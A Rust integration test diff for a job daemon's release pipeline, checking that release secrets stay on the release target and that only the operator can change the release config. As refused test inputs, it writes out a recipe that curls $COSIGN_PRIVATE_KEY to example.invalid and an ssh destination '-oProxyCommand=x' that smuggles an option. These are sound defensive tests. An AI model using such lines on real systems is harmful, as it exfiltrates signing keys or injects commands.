@@ -27,6 +27,14 @@ use terrarium_host::{Client, ClientOptions};
 /// only: each poll returns as soon as its state is there.
 const DEADLINE: Duration = Duration::from_secs(300);
 
+/// A wait on the queue or a card that fails after [`DEADLINE`] without
+/// progress, or after two of them in all. Under merge-job load (load 39,
+/// IO pressure 40%) a queue that still moved took longer than
+/// [`DEADLINE`] from the start of the wait (TER-674).
+fn stall<M: PartialEq + std::fmt::Debug>(mark: M) -> common::Stall<M> {
+    common::Stall::with_limits(mark, DEADLINE, 2 * DEADLINE)
+}
+
 /// Run the test `$name(flow)` once with each board flow (TER-170): the
 /// tests `$name::code` and `$name::rules`.
 macro_rules! both_flows {
@@ -529,6 +537,7 @@ async fn a_jobs_eta_starts_when_the_job_runs() {
             card,
             branch: "b".into(),
             by_agent: Some("w".into()),
+            commit: None,
             outcome: None,
             note: None,
         })
@@ -1074,7 +1083,7 @@ impl Lab {
     /// engine then settles, so the later actions of the run that made `f`
     /// true (an unassign after a move) are there too.
     async fn until_card(&self, id: &str, what: &str, f: impl Fn(&Value) -> bool) -> Value {
-        let start = Instant::now();
+        let mut stall = stall((self.td.last_seq().await, Value::Null));
         loop {
             let c = self.card_of(id).await;
             if f(&c) {
@@ -1084,7 +1093,7 @@ impl Lab {
                 self.settle().await;
                 return self.card_of(id).await;
             }
-            if start.elapsed() >= DEADLINE {
+            if stall.due() && !stall.moved((self.td.last_seq().await, c["updated_at"].clone())) {
                 let runs = self.td.get("/api/projects/p/rules/runs?limit=200").await;
                 let runs: Vec<Value> = runs.body["runs"]
                     .as_array()
@@ -1093,7 +1102,7 @@ impl Lab {
                     .into_iter()
                     .filter(|r| r["state"] != "noop" && r["card"] == id)
                     .collect();
-                panic!("card {id} never got {what}; last {c}\nrule runs: {runs:#?}");
+                panic!("card {id} never got {what} ({stall}); last {c}\nrule runs: {runs:#?}");
             }
             tokio::time::sleep(Duration::from_millis(50)).await;
         }
@@ -1158,13 +1167,22 @@ impl Lab {
     }
 
     async fn until_idle(&self) -> Vec<Value> {
-        let start = Instant::now();
+        let mut stall = stall((self.td.last_seq().await, Vec::new()));
         loop {
             let v = self.td.get("/api/projects/p/jobs").await.ok().clone();
             if v["running"] == 0 && v["queued"] == 0 {
                 return v["jobs"].as_array().unwrap().clone();
             }
-            assert!(start.elapsed() < DEADLINE, "the queue never drained: {v}");
+            // The state and the tail length of each job, not `at`: the time
+            // of the answer moves on each poll.
+            if stall.due() {
+                let jobs = v["jobs"].as_array().unwrap().iter();
+                let jobs: Vec<_> = jobs
+                    .map(|j| (j["state"].clone(), j["tail"].as_str().map(str::len)))
+                    .collect();
+                let mark = (self.td.last_seq().await, jobs);
+                assert!(stall.moved(mark), "the queue never drained ({stall}): {v}");
+            }
             tokio::time::sleep(Duration::from_millis(50)).await;
         }
     }
@@ -1331,6 +1349,18 @@ async fn a_green_validation_moves_the_card_to_review(flow: &'static str) {
         .find(|c| c["body"] == "done by w1")
         .unwrap();
     assert_eq!(own["author"], lab.w1.as_str(), "{own:#}");
+    let queued = c["comments"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|c| c["body"].as_str().is_some_and(|b| b.contains("queued")))
+        .expect("queue note");
+    let expected_author = if flow == "rules" {
+        "rule:p/validate-queued-move"
+    } else {
+        "system"
+    };
+    assert_eq!(queued["author"], expected_author, "{queued:#}");
     std::fs::write(&gate, "").unwrap();
     let c = lab
         .until_card(&id, "review", |c| c["column"] == "review")
@@ -2508,6 +2538,11 @@ fn daemon_trace_capture() -> TraceCapture {
 #[tokio::test]
 async fn merge_job_resolves_daemon_credentials_resets_before_tunnel_and_revokes() {
     use std::os::unix::fs::PermissionsExt;
+    // The failed resets are infra failures that run once more after
+    // `INFRA_RETRY`: 5 min by default, which only another test of this
+    // binary made short (a global). When this test ran first, a held
+    // retry outlasted the drain wait (TER-674).
+    terrariumd::jobs::set_infra_retry(Duration::from_millis(200));
     let trace = daemon_trace_capture();
     let fixtures = tempfile::tempdir().unwrap();
     let ssh = fixtures.path().join("ssh");
@@ -2800,6 +2835,1179 @@ async fn delivery_secret_config_refuses_plaintext_and_arbitrary_env_injection() 
     }
 }
 
+/// TER-623: a release job runs the release recipe on the release target,
+/// with the release secrets in its env and the release VM relay as
+/// TERRARIUM_DOCKER_HOST. The VM key never reaches the recipe, a merge job
+/// of the same daemon never sees a release secret, a grant that does not
+/// name the release target refuses the release before its recipe, and no
+/// secret value is in the job output, the events, or the audit.
+#[tokio::test]
+async fn a_release_job_gets_its_secrets_only_on_the_release_target() {
+    use std::os::unix::fs::PermissionsExt;
+    const GH: &str = "dummy-gh-token-623-0123456789";
+    const COSIGN: &str = "dummy-cosign-password-623-0123456789";
+    const VM_KEY: &str = "dummy-release-vm-key-623-0123456789";
+    let fixtures = tempfile::tempdir().unwrap();
+    let ssh = fixtures.path().join("ssh");
+    std::fs::write(
+        &ssh,
+        format!(
+            r#"#!/usr/bin/env python3
+import os, pathlib, socket, sys
+root = pathlib.Path({root:?})
+args = sys.argv[1:]
+key = pathlib.Path(args[args.index('-i') + 1]).read_text()
+assert 'SSH_AUTH_SOCK' not in os.environ
+assert '-L' in args
+assert key == {key:?}
+assert 'StrictHostKeyChecking=yes' in args
+pin_arg = next(a for a in args if a.startswith('UserKnownHostsFile='))
+assert pathlib.Path(pin_arg.split('=', 1)[1]).read_text().startswith('test-release-vm ')
+assert args[-1] == 'root@test-release-vm'
+assert args[args.index('-p') + 1] == '2251'
+with (root / 'order').open('a') as f: f.write('tunnel\n')
+s = socket.socket(socket.AF_UNIX)
+s.bind(args[args.index('-L') + 1].split(':')[0])
+s.listen()
+while True:
+    c, _ = s.accept()
+    c.recv(4096)
+    c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK')
+    c.close()
+"#,
+            root = fixtures.path().to_str().unwrap(),
+            key = VM_KEY,
+        ),
+    )
+    .unwrap();
+    std::fs::set_permissions(&ssh, std::fs::Permissions::from_mode(0o700)).unwrap();
+    let lab = lab_impl_ssh(1, None, "code", Some(ssh.to_str().unwrap())).await;
+    // The release client is a machine of its own (F2): host agent lab2.
+    release_client(&lab, "rel-client").await;
+    for (name, value) in [
+        ("release-github", GH),
+        ("release-cosign", COSIGN),
+        ("release-vm", VM_KEY),
+    ] {
+        lab.td
+            .put(
+                &format!("/api/secrets/p/{name}"),
+                json!({"kind":"api_key", "fields":{"value":value}}),
+            )
+            .await
+            .ok();
+        lab.td
+            .post(
+                &format!("/api/secrets/p/{name}/grants"),
+                json!({"grantee":"delivery:p", "level":"run", "targets":["rel-client"]}),
+            )
+            .await
+            .ok();
+    }
+    let dump = |file: &Path| {
+        format!(
+            r#"python3 -I -c 'import json,os,pathlib; pathlib.Path("{}").write_text(json.dumps(dict(os.environ)))'"#,
+            file.display()
+        )
+    };
+    let merge_env = fixtures.path().join("merge-env.json");
+    let release_env = fixtures.path().join("release-env.json");
+    let marker = fixtures.path().join("release-started");
+    let release_recipe = format!(
+        r#"touch '{marker}' && {dump} && test -S "${{TERRARIUM_DOCKER_HOST#unix://}}" && test -z "${{DOCKER_RELEASE_KEY:-}}${{DOCKER_HOST:-}}" && test "$(git rev-parse HEAD)" = "$TERRARIUM_HEAD" && echo "token $GH_TOKEN" && echo release-ok"#,
+        marker = marker.display(),
+        dump = dump(&release_env),
+    );
+    let config = json!({
+        "target": "p-box", "recipe": format!("{} && test -f OK", dump(&merge_env)),
+        "next_repos": ["app"], "work_dir": lab._dirs.path().join("jobs"),
+        "release_target": "rel-client", "release_recipe": release_recipe,
+        "release_secrets": {"GH_TOKEN": "@secret:release-github",
+                            "COSIGN_PASSWORD": "@secret:release-cosign.value"},
+        "docker_release": {"destination": "root@test-release-vm", "port": 2251,
+                           "known_hosts": "test-release-vm ssh-ed25519 public-test-pin\n",
+                           "key": "@secret:release-vm"}});
+    let r = lab.td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+
+    // The release, on the head of main.
+    let main = git(&lab.origin, &["rev-parse", "main"]);
+    let card = lab.card("v1.0.0", "v1").await;
+    let r = lab
+        .td
+        .post_as(
+            &lab.lead,
+            &format!("/api/cards/{card}/release"),
+            json!({"commit": "0000000000000000000000000000000000000000"}),
+        )
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    let r = lab
+        .td
+        .post_as(&lab.w1, &format!("/api/cards/{card}/release"), json!({}))
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    let r = lab
+        .td
+        .post_as(
+            &lab.lead,
+            &format!("/api/cards/{card}/release"),
+            json!({"commit": &main[..12]}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    assert_eq!(r.body["job"]["kind"], "release", "{}", r.body);
+    assert_eq!(r.body["job"]["branch"], "main", "{}", r.body);
+    assert_eq!(r.body["job"]["commit"], main.as_str(), "{}", r.body);
+    let jobs = lab.until_idle().await;
+    let job = jobs.iter().find(|j| j["card"] == card.as_str()).unwrap();
+    assert_eq!(job["state"], "passed", "{job:#}");
+    let env: std::collections::BTreeMap<String, String> =
+        serde_json::from_slice(&std::fs::read(&release_env).unwrap()).unwrap();
+    assert_eq!(env["GH_TOKEN"], GH);
+    assert_eq!(env["COSIGN_PASSWORD"], COSIGN);
+    assert_eq!(env["TERRARIUM_JOB_KIND"], "release");
+    assert_eq!(env["TERRARIUM_HEAD"], main);
+    assert!(env["TERRARIUM_DOCKER_HOST"].starts_with("unix://"));
+    assert!(!env.contains_key("DOCKER_RELEASE_KEY"));
+    assert!(!env.contains_key("TERRARIUM_BASE"));
+    assert!(
+        env.values().all(|v| !v.contains(VM_KEY)),
+        "the VM key reached the recipe"
+    );
+    let order = std::fs::read_to_string(fixtures.path().join("order")).unwrap();
+    assert_eq!(order, "tunnel\n");
+    // The card stays where it is, with a comment of the end.
+    let c = lab.td.get(&format!("/api/cards/{card}")).await.ok().clone();
+    assert_eq!(c["column"], "backlog", "{c:#}");
+    let detail = lab
+        .td
+        .get(&format!("/api/jobs/{}", job["id"].as_str().unwrap()))
+        .await
+        .ok()
+        .to_string();
+    assert!(detail.contains("release-ok"), "{detail}");
+    assert!(detail.contains("token "), "{detail}");
+
+    // A merge job on the same daemon: no release secret, no relay.
+    lab.branch("ter-m623", "next", &[("OK", "yes\n")]);
+    let mcard = lab.card("merge", "ter-m623").await;
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{mcard}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let jobs = lab.until_idle().await;
+    let mjob = jobs.iter().find(|j| j["card"] == mcard.as_str()).unwrap();
+    assert_eq!(mjob["state"], "passed", "{mjob:#}");
+    let env: std::collections::BTreeMap<String, String> =
+        serde_json::from_slice(&std::fs::read(&merge_env).unwrap()).unwrap();
+    for name in [
+        "GH_TOKEN",
+        "COSIGN_PASSWORD",
+        "DOCKER_RELEASE_KEY",
+        "TERRARIUM_DOCKER_HOST",
+    ] {
+        assert!(!env.contains_key(name), "{name} in a merge job");
+    }
+    for secret in [GH, COSIGN, VM_KEY] {
+        assert!(env.values().all(|v| !v.contains(secret)));
+    }
+
+    // A grant that does not name the release target: refused before the
+    // recipe and before the tunnel.
+    let _ = std::fs::remove_file(&marker);
+    lab.td
+        .delete("/api/secrets/p/release-github/grants?grantee=delivery:p")
+        .await
+        .ok();
+    lab.td
+        .post(
+            "/api/secrets/p/release-github/grants",
+            json!({"grantee":"delivery:p", "level":"run", "targets":["p-box"]}),
+        )
+        .await
+        .ok();
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/release"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let jobs = lab.until_idle().await;
+    let job = jobs
+        .iter()
+        .find(|j| j["card"] == card.as_str() && j["state"] != "passed")
+        .unwrap();
+    assert_eq!(job["state"], "failed", "{job:#}");
+    assert!(!marker.exists(), "the recipe ran without its grant");
+    let detail = lab
+        .td
+        .get(&format!("/api/jobs/{}", job["id"].as_str().unwrap()))
+        .await
+        .ok()
+        .to_string();
+    assert!(detail.contains("not target `rel-client`"), "{detail}");
+    let order = std::fs::read_to_string(fixtures.path().join("order")).unwrap();
+    assert_eq!(order, "tunnel\n", "a refused release opened the tunnel");
+
+    // No secret value in the jobs, the events, or the audit.
+    let all = lab.td.get("/api/projects/p/jobs").await.ok().to_string();
+    let audit = lab.td.get("/api/audit").await.ok().to_string();
+    let events = lab
+        .td
+        .daemon
+        .as_ref()
+        .unwrap()
+        .state
+        .db
+        .read(|c| {
+            let mut statement =
+                c.prepare("SELECT summary || payload FROM events WHERE project = 'p'")?;
+            let rows = statement.query_map([], |r| r.get::<_, String>(0))?;
+            Ok(rows.collect::<Result<Vec<_>, _>>()?.join("\n"))
+        })
+        .await
+        .unwrap();
+    for secret in [GH, COSIGN, VM_KEY] {
+        for (what, text) in [
+            ("job", &detail),
+            ("jobs", &all),
+            ("audit", &audit),
+            ("events", &events),
+        ] {
+            assert!(!text.contains(secret), "a secret in the {what}");
+        }
+    }
+    assert!(audit.contains("release-github"), "{audit}");
+    // A release is no verdict on a card.
+    assert!(!events.contains(&format!(
+        "release job {} for {card}:",
+        job["id"].as_str().unwrap()
+    )));
+}
+
+/// TER-623: the release config fails closed. The release target runs
+/// release jobs only, the secret names are those of the release, and
+/// every value is a reference.
+#[tokio::test]
+async fn the_release_config_refuses_a_shared_target_and_plain_values() {
+    let lab = lab(1).await;
+    release_client(&lab, "rel-client").await;
+    // F2: a second name for the machine of the job target (host agent
+    // lab1), and two ssh targets for one ssh host and port.
+    for t in [
+        json!({"name": "p-alias", "kind": "host", "host": "lab1", "project": "p"}),
+        json!({"name": "p-s-one", "kind": "ssh", "address": "release@10.9.0.2", "port": 2252, "project": "p"}),
+        json!({"name": "p-s-two", "kind": "ssh", "address": "other@10.9.0.2", "port": 2252, "project": "p"}),
+        json!({"name": "s-port", "kind": "ssh", "address": "release@10.9.0.2", "port": 2253}),
+    ] {
+        let r = lab.td.post("/api/targets", t).await;
+        assert_eq!(r.status, 201, "{}", r.body);
+    }
+    for (target, release) in [("p-box", "p-alias"), ("p-s-one", "p-s-two")] {
+        let r = lab
+            .td
+            .put(
+                "/api/projects/p/delivery",
+                json!({"target": target, "recipe": "true", "release_target": release}),
+            )
+            .await;
+        assert_eq!(r.status, 422, "{target} and {release}: {}", r.body);
+        assert!(r.body.to_string().contains("machine"), "{}", r.body);
+    }
+    // Another port is another machine.
+    let r = lab
+        .td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-s-one", "recipe": "true", "release_target": "s-port"}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let base = json!({"target": "p-box", "recipe": "true", "release_target": "rel-client"});
+    let mut bad = Vec::new();
+    for (key, value) in [
+        ("release_target", json!("p-box")),
+        ("release_target", json!("q-box")),
+        ("release_secrets", json!({"PATH": "@secret:release-github"})),
+        ("release_secrets", json!({"GH_TOKEN": "plain-token"})),
+        (
+            "release_secrets",
+            json!({"DOCKER_RELEASE_KEY": "@secret:release-vm"}),
+        ),
+        (
+            "docker_release",
+            json!({"destination": "-oProxyCommand=x", "port": 22,
+                                   "known_hosts": "vm ssh-ed25519 pin", "key": "@secret:vm"}),
+        ),
+        (
+            "docker_release",
+            json!({"destination": "root@vm", "port": 22,
+                                   "known_hosts": "vm ssh-ed25519 pin", "key": "plain-key"}),
+        ),
+        (
+            "docker_release",
+            json!({"destination": "root@vm", "port": 22,
+                                   "known_hosts": "", "key": "@secret:vm"}),
+        ),
+    ] {
+        let mut config = base.clone();
+        config[key] = value;
+        bad.push(config);
+    }
+    let mut config = base.clone();
+    config.as_object_mut().unwrap().remove("release_target");
+    config["release_secrets"] = json!({"GH_TOKEN": "@secret:release-github"});
+    bad.push(config);
+    for config in bad {
+        let r = lab.td.put("/api/projects/p/delivery", config.clone()).await;
+        assert!(
+            matches!(r.status.as_u16(), 403 | 409 | 422),
+            "{config}: {} {}",
+            r.status,
+            r.body
+        );
+    }
+    // The release target of `p` cannot be the job target of `q`.
+    let r = lab.td.put("/api/projects/p/delivery", base.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = lab
+        .td
+        .post(
+            "/api/targets",
+            json!({"name": "gshared", "kind": "host", "host": "lab2"}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let mut p = base.clone();
+    p["release_target"] = json!("gshared");
+    let r = lab.td.put("/api/projects/p/delivery", p).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = lab
+        .td
+        .put(
+            "/api/projects/q/delivery",
+            json!({"target": "gshared", "recipe": "true"}),
+        )
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+}
+
+/// A second host agent `lab2` with the global release client target
+/// `name` on it (TER-623: the release client is a machine of its own, and a
+/// global target that the operator defines). Returns the host agent's task.
+async fn release_client(lab: &Lab, name: &str) -> tokio::task::JoinHandle<()> {
+    let td = &lab.td;
+    let r = td.post("/api/hosts", json!({"name": "lab2"})).await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let token = r.body["token"].as_str().unwrap().to_owned();
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": name, "kind": "host", "host": "lab2"}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    connect_host(
+        td,
+        lab.hosts_addr,
+        "lab2",
+        &token,
+        &lab._dirs.path().join("lab2"),
+        None,
+    )
+    .await
+    .1
+}
+
+/// TER-623, review-ter-623 F1: a release target is for the release job and
+/// the operator only. A release target is refused while an agent lists it
+/// in its policy or holds a lease on it. Once it is one, no policy entry and
+/// no lease may name it, whoever writes it (the operator, the lead), and an
+/// agent that has it in its policy anyway (an old row) cannot exec, shell
+/// or copy there. The release job still runs.
+#[tokio::test]
+async fn the_release_target_is_for_the_release_job_only() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    release_client(&lab, "rel-client").await;
+    let marker = lab._dirs.path().join("release-ran");
+    let config = json!({"target": "p-box", "recipe": "true", "next_repos": ["app"],
+                        "work_dir": lab._dirs.path().join("jobs"),
+                        "release_target": "rel-client",
+                        "release_recipe": format!("touch '{}'", marker.display())});
+    // Held by a policy, then by a lease: no release target.
+    let w1 = format!("/api/agents/{}", lab.w1);
+    let r = td
+        .patch(&w1, json!({"policy": {"targets": ["rel-client"]}}))
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(r.body.to_string().contains("policy.targets"), "{}", r.body);
+    let r = td.patch(&w1, json!({"policy": {"targets": []}})).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td
+        .post("/api/targets/rel-client/leases", json!({"agent": "p/w1"}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(r.body.to_string().contains("lease"), "{}", r.body);
+    let r = td.delete("/api/targets/rel-client/leases/p%2Fw1").await;
+    assert!(r.status.is_success(), "{} {}", r.status, r.body);
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+
+    // Now nobody may list it or lease it.
+    let rule = "release target runs release jobs only";
+    let r = td
+        .patch(&w1, json!({"policy": {"targets": ["rel-client"]}}))
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    let r = td
+        .patch_as(
+            &lab.lead,
+            &w1,
+            json!({"policy": {"targets": ["rel-client"]}}),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    for who in [None, Some(&lab.lead)] {
+        let body = json!({"agent": "p/w1"});
+        let r = match who {
+            None => td.post("/api/targets/rel-client/leases", body).await,
+            Some(a) => td.post_as(a, "/api/targets/rel-client/leases", body).await,
+        };
+        assert_eq!(r.status, 403, "{}", r.body);
+        if who.is_none() {
+            assert!(r.body.to_string().contains(rule), "{}", r.body);
+        }
+    }
+    // An agent with it in its policy row (written before the rule) gets
+    // no exec, shell or copy.
+    let id = lab.w1.clone();
+    td.daemon
+        .as_ref()
+        .unwrap()
+        .state
+        .db
+        .write("operator", move |t| {
+            t.execute(
+                "UPDATE agents SET policy = '{\"targets\":[\"rel-client\"]}' WHERE id = ?1",
+                rusqlite::params![id],
+            )?;
+            Ok(())
+        })
+        .await
+        .unwrap();
+    for (path, body) in [
+        ("/api/targets/rel-client/exec", json!({"cmd": ["true"]})),
+        ("/api/targets/rel-client/exec", json!({"shell": true})),
+        (
+            "/api/targets/rel-client/cp",
+            json!({"direction": "pull", "path": "/tmp/x"}),
+        ),
+    ] {
+        let r = td.post_as(&lab.w1, path, body).await;
+        assert_eq!(r.status, 403, "{path}: {}", r.body);
+        assert!(r.body.to_string().contains(rule), "{path}: {}", r.body);
+    }
+    // The operator keeps access, and the release job runs.
+    let r = td
+        .post("/api/targets/rel-client/exec", json!({"cmd": ["true"]}))
+        .await;
+    assert!(r.status.is_success(), "{} {}", r.status, r.body);
+    let card = lab.card("v2", "v2").await;
+    let r = td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/release"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let jobs = lab.until_idle().await;
+    let job = jobs.iter().find(|j| j["card"] == card.as_str()).unwrap();
+    assert_eq!(job["state"], "passed", "{job:#}");
+    assert!(marker.exists());
+}
+
+/// TER-623 round 3 (review-ter-623-r2): the release config and the release
+/// target are the operator's. A project admin (the lead) cannot set or
+/// change any release field, cannot patch or delete the release target,
+/// cannot define a second target on its machine (a host agent alias or the
+/// same ssh host and port), and cannot use such an alias. No tool may name
+/// the release target or its machine, and a target that a tool names cannot
+/// become one. The lead still starts a release with the stored config.
+#[tokio::test]
+async fn the_release_config_and_target_are_the_operators() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    release_client(&lab, "rel-client").await;
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": "rel-ssh", "kind": "ssh", "address": "release@10.9.0.3", "port": 2252}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let marker = lab._dirs.path().join("release-ran");
+    let config = json!({"target": "p-box", "recipe": "true", "next_repos": ["app"],
+                        "work_dir": lab._dirs.path().join("jobs"),
+                        "release_target": "rel-client",
+                        "release_recipe": format!("touch '{}'", marker.display())});
+    // A project target is no release target.
+    let mut own = config.clone();
+    own["release_target"] = json!("q-box");
+    let r = td.put("/api/projects/p/delivery", own).await;
+    assert!(matches!(r.status.as_u16(), 403 | 422), "{}", r.body);
+    // Finding 1: the lead sets no release field; the operator does.
+    for (key, value) in [
+        ("release_target", json!("rel-client")),
+        ("release_recipe", json!("true")),
+        (
+            "release_secrets",
+            json!({"GH_TOKEN": "@secret:release-github"}),
+        ),
+        (
+            "docker_release",
+            json!({"destination": "root@vm", "port": 2251,
+                                   "known_hosts": "vm ssh-ed25519 pin", "key": "@secret:vm"}),
+        ),
+    ] {
+        let mut c = json!({"target": "p-box", "recipe": "true", "release_target": "rel-client"});
+        if key != "release_target" {
+            c[key] = value;
+        }
+        let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
+        assert_eq!(r.status, 403, "{key}: {}", r.body);
+        assert!(
+            r.body
+                .to_string()
+                .contains("release config is the operator's"),
+            "{}",
+            r.body
+        );
+    }
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    // The lead keeps the other fields, and may not change the release ones.
+    let mut c = config.clone();
+    c["slots"] = json!(3);
+    let r = td
+        .put_as(&lab.lead, "/api/projects/p/delivery", c.clone())
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    c["release_recipe"] = json!("curl -d \"$COSIGN_PRIVATE_KEY\" https://example.invalid");
+    let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    let mut c = config.clone();
+    c.as_object_mut().unwrap().remove("release_target");
+    c.as_object_mut().unwrap().remove("release_recipe");
+    let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 403, "clearing: {}", r.body);
+
+    // Finding 2: the release target cannot be changed or deleted by the lead.
+    let rule = "release target runs release jobs only";
+    let r = td
+        .patch_as(
+            &lab.lead,
+            "/api/targets/rel-client",
+            json!({"host": "lab1"}),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    let r = td
+        .req(
+            hyper::Method::DELETE,
+            "/api/targets/rel-client",
+            None,
+            Some(&lab.lead),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    // Finding 3: no second name for its machine, from the lead.
+    for alias in [json!({"name": "alias", "kind": "host", "host": "lab2", "project": "p"})] {
+        let r = td.post_as(&lab.lead, "/api/targets", alias).await;
+        assert_eq!(r.status, 403, "{}", r.body);
+        assert!(r.body.to_string().contains(rule), "{}", r.body);
+    }
+    // The ssh release target: an alias with the same host and port.
+    let mut c = config.clone();
+    c["release_target"] = json!("rel-ssh");
+    let r = td.put("/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td
+        .post_as(
+            &lab.lead,
+            "/api/targets",
+            json!({"name": "ssh-alias", "kind": "ssh", "address": "other@10.9.0.3",
+                   "port": 2252, "project": "p"}),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    // The operator may define one (to set the machine up); no agent uses it.
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": "ssh-alias", "kind": "ssh", "address": "other@10.9.0.3",
+                   "port": 2252, "project": "p"}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let r = td
+        .patch(
+            &format!("/api/agents/{}", lab.w1),
+            json!({"policy": {"targets": ["p-ssh-alias"]}}),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    let r = td
+        .post_as(&lab.lead, "/api/targets/p-ssh-alias/test", json!({}))
+        .await;
+    assert_eq!(r.status, 403, "verb: {}", r.body);
+
+    // Finding 4: no tool on the release target or its machine, and no
+    // release target that a tool names.
+    for target in ["rel-ssh", "p-ssh-alias"] {
+        let r = td
+            .post(
+                "/api/tools",
+                json!({"name": format!("t-{target}"), "target": target, "command": ["true"]}),
+            )
+            .await;
+        assert_eq!(r.status, 403, "{target}: {}", r.body);
+        assert!(r.body.to_string().contains(rule), "{}", r.body);
+    }
+    // rel-client stays protected after the switch (round 4): the
+    // operator retires it first.
+    let r = td.delete("/api/release-targets/rel-client").await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td
+        .post(
+            "/api/tools",
+            json!({"name": "t-client", "target": "rel-client", "command": ["true"]}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let mut c = config.clone();
+    c["release_target"] = json!("rel-client");
+    let r = td.put("/api/projects/p/delivery", c).await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(r.body.to_string().contains("tool"), "{}", r.body);
+
+    // The lead still starts a release with the stored config.
+    let r = td.delete("/api/tools/t-client").await;
+    assert!(r.status.is_success(), "{} {}", r.status, r.body);
+    let r = td.put("/api/projects/p/delivery", config.clone()).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let card = lab.card("v4", "v4").await;
+    let r = td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/release"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let jobs = lab.until_idle().await;
+    let job = jobs.iter().find(|j| j["card"] == card.as_str()).unwrap();
+    assert_eq!(job["state"], "passed", "{job:#}");
+    assert!(marker.exists());
+}
+
+/// TER-623 round 4 (review-ter-623-r3 finding 1): a fleet apply follows
+/// the rule of the target API. A sysadmin agent cannot change the release
+/// target, delete it by a prune, or add a target on its machine through a
+/// fleet; the operator can.
+#[tokio::test]
+async fn a_fleet_cannot_change_the_release_target_unless_the_operator_applies_it() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    let sys = td.agent("p", "sys", json!({"roles": ["sysadmin"]})).await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    let fleet = |address: &str, port: u16| {
+        format!(
+            "name = \"rel\"\n[[targets]]\nname = \"rel-fleet\"\nkind = \"ssh\"\naddress = \"{address}\"\nport = {port}\n"
+        )
+    };
+    let apply =
+        |content: String, prune: bool| json!({"content": content, "prune": prune, "confirm": true});
+    let r = td
+        .post(
+            "/api/fleet/apply",
+            apply(fleet("release@10.9.0.4", 2252), false),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "true", "release_target": "rel-fleet"}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let rule = "release target runs release jobs only";
+    // An update of the release target by a sysadmin agent.
+    let r = td
+        .post_as(
+            &sys,
+            "/api/fleet/apply",
+            apply(fleet("release@10.9.0.99", 2252), false),
+        )
+        .await;
+    assert_eq!(r.status, 403, "update: {}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    // Its delete by a prune.
+    let r = td
+        .post_as(
+            &sys,
+            "/api/fleet/apply",
+            apply("name = \"rel\"\n".into(), true),
+        )
+        .await;
+    assert_eq!(r.status, 403, "prune: {}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    // A second name for its machine.
